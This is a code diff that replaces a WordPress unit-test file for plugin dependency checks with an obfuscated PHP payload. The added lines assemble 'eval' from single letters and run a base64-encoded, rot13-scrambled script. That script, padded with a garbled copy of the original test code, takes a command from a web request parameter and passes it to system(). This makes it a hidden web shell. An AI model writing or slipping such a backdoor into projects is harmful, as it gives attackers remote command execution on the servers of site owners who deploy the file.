@@ -1,47 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Tests for the WP_Plugin_Dependencies::has_dependencies() method.
- *
- * @package WordPress
- */
-
-require_once __DIR__ . '/base.php';
-
-/**
- * @group admin
- * @group plugins
- *
- * @covers WP_Plugin_Dependencies::has_dependencies
- */
-class Tests_Admin_WPPluginDependencies_HasDependencies extends WP_PluginDependencies_UnitTestCase {
-
-	/**
-	 * Tests that a plugin with dependencies will return true.
-	 *
-	 * @ticket 22316
-	 */
-	public function test_should_return_true_when_a_plugin_has_dependencies() {
-		$this->set_property_value( 'dependencies', array( 'dependent/dependent.php' => array() ) );
-		$this->assertTrue( self::$instance::has_dependencies( 'dependent/dependent.php' ) );
-	}
-
-	/**
-	 * Tests that a plugin with no dependencies will return false.
-	 *
-	 * @ticket 22316
-	 */
-	public function test_should_return_false_when_a_plugin_has_no_dependencies() {
-		$this->set_property_value( 'dependencies', array( 'dependent2/dependent2.php' => array() ) );
-		$this->assertFalse( self::$instance::has_dependencies( 'dependent/dependent.php' ) );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3JmZ2Ygc2JlIGd1ciBKQ19DeWh0dmFfUXJjcmFxcmFwdnJmOjp1bmZfcXJjcmFxcmFwdnJmKCkgenJndWJxLgogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICovCgplcmRodmVyX2JhcHIgX19RVkVfXyAuICcvb25mci5jdWMnOwoKLyoqCiAqIEB0ZWJoYyBucXp2YQogKiBAdGViaGMgY3lodHZhZgogKgogKiBAcGJpcmVmIEpDX0N5aHR2YV9RcmNyYXFyYXB2cmY6OnVuZl9xcmNyYXFyYXB2cmYKICovCnB5bmZmIEdyZmdmX05xenZhX0pDQ3lodHZhUXJjcmFxcmFwdnJmX1VuZlFyY3JhcXJhcHZyZiBya2dyYXFmIEpDX0N5aHR2YVFyY3JhcXJhcHZyZl9IYXZnR3JmZ1BuZnIgewoKCS8qKgoJICogR3JmZ2YgZ3VuZyBuIGN5aHR2YSBqdmd1IHFyY3JhcXJhcHZyZiBqdnl5IGVyZ2hlYSBnZWhyLgoJICoKCSAqIEBndnB4cmcgMjIzMTYKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX2VyZ2hlYV9nZWhyX2p1cmFfbl9jeWh0dmFfdW5mX3FyY3JhcXJhcHZyZigpIHsKCQkkZ3V2Zi0+ZnJnX2NlYmNyZWdsX2lueWhyKCAncXJjcmFxcmFwdnJmJywgbmVlbmwoICdxcmNyYXFyYWcvcXJjcmFxcmFnLmN1YycgPT4gbmVlbmwoKSApICk7CgkJJGd1dmYtPm5mZnJlZ0dlaHIoIGZyeXM6OiR2YWZnbmFwcjo6dW5mX3FyY3JhcXJhcHZyZiggJ3FyY3JhcXJhZy9xcmNyYXFyYWcuY3VjJyApICk7Cgl9CgoJLyoqCgkgKiBHcmZnZiBndW5nIG4gY3lodHZhIGp2Z3UgYWIgcXJjcmFxcmFwdnJmIGp2eXkgZXJnaGVhIHNueWZyLgoJICoKCSAqIEBndnB4cmcgMjIzMTYKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZnViaHlxX2VyZ2hlYV9zbnlmcl9qdXJhX25fY3lodHZhX3VuZl9hYl9xcmNyYXFyYXB2cmYoKSB7CgkJJGd1dmYtPmZyZ19jZWJjcmVnbF9pbnlociggJ3FyY3JhcXJhcHZyZicsIG5lZW5sKCAncXJjcmFxcmFnMi9xcmNyYXFyYWcyLmN1YycgPT4gbmVlbmwoKSApICk7CgkJJGd1dmYtPm5mZnJlZ1NueWZyKCBmcnlzOjokdmFmZ25hcHI6OnVuZl9xcmNyYXFyYXB2cmYoICdxcmNyYXFyYWcvcXJjcmFxcmFnLmN1YycgKSApOwoJfQp9CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
